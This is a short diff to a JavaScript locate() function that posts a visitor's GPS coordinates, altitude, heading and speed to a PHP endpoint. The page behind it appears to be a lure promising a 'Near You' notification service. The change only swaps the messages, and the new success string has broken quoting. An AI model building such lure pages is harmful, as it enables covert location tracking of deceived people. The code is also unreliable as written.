@@ -23,10 +23,10 @@ function locate()
       type: 'POST',
       url: './php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Coming Soon');},
+      success: function(){$('#change').html(''Ready For Enjoy'');},
       mimeType: 'text'
     });
-    alert('Thankyou For Taking Interest in Near You We will notify you...');
+    alert('Thankyou==>> Very Soon We Will Send You Details...');
   };
 }
 
